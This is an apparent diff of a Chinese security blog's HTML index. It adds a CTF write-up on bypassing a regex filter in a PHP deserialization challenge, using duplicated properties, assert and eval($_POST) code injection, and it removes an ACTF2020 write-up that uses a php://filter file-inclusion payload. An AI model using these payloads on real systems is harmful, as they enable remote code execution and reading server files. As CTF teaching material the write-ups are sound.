@@ -169,6 +169,78 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-php逃逸" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/08/php%E9%80%83%E9%80%B8/" class="article-date">
+  	<time datetime="2021-08-07T16:00:00.000Z" itemprop="datePublished">2021-08-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/08/php%E9%80%83%E9%80%B8/">
+        php逃逸
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php逃逸"><a href="#php逃逸" class="headerlink" title="php逃逸"></a>php逃逸</h1><p>查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$safe=&quot;Hack me!&quot;;</span><br><span class="line"></span><br><span class="line">class Hacker&#123;</span><br><span class="line">    public $name=&quot;var_dump&quot;;</span><br><span class="line">    public $msg=&quot;Happy to cjb&quot;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        global $safe;</span><br><span class="line">        if(preg_match(&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;,$this-&gt;msg))&#123;</span><br><span class="line">            $this-&gt;name=&quot;var_dump&quot;;</span><br><span class="line">            $this-&gt;msg=&quot;You look dangerous!!!&quot;;</span><br><span class="line">            $safe=&quot;I think waf is enough.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        call_user_func($this-&gt;name,$this-&gt;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        global $safe;</span><br><span class="line">        var_dump($safe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一种思路，可以利用shell来绕过，可构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_POST[&#x27;shell&#x27;])&amp;&amp;shell=写命令</span><br></pre></td></tr></table></figure>
+<p>来绕过，构造payload就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#x27;shell&#x27;]);&quot;;&#125;&amp;&amp;shell=show_source(&quot;/you_never_know_my_name&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>第二种思路</p>
+<p>就是在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（注意：类的属性个数记得加1）</p>
+<p>第三种思路</p>
+<p>这里过滤了系统执行的函数，而又不知道flag的文件名，因此这里可以用assert绕过，但是这里的正则过滤了括号嵌套，而不用get或post很难进行输出<br>因此可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global $safe;</span><br><span class="line">var_dump($safe);</span><br></pre></td></tr></table></figure>
+<p>来输出，所以可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看flag文件名</span><br><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;)?scandir(&#x27;.&#x27;):&#x27;&#x27;&quot;;&#125;</span><br><span class="line"></span><br><span class="line">读flag文件</span><br><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).file_get_contents(&#x27;you_never_know_my_name&#x27;)&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-ssl数字证书" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -955,72 +1027,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-ACTF2020 新生赛(Include文件包含）" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B(Include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B(Include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/">
-        ACTF2020 新生赛(Include文件包含）
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="include函数的文件包含"><a href="#include函数的文件包含" class="headerlink" title="include函数的文件包含"></a>include函数的文件包含</h2><h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>include函数是包含并运行指定的文件，如果有看到?file=，则一般要先想到include函数的文件包含，而且一般和伪协议一起使用</p>
-<p>##实例<br>看到?file=，且题目提示include函数，因此可以想到文件包含和伪协议的联合使用</p>
-<p>因此可以构造payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=conver.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<p>![ACTF2020 新生赛1](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020</a> 新生赛1.jpg)</p>
-<p>可以看到出现base64编码的数，然后进行解码即可得到flag</p>
-<p>![ACTF2020 新生赛2](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020</a> 新生赛2.jpg)</p>
-<p>![ACTF2020 新生赛3](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020</a> 新生赛3.jpg)</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
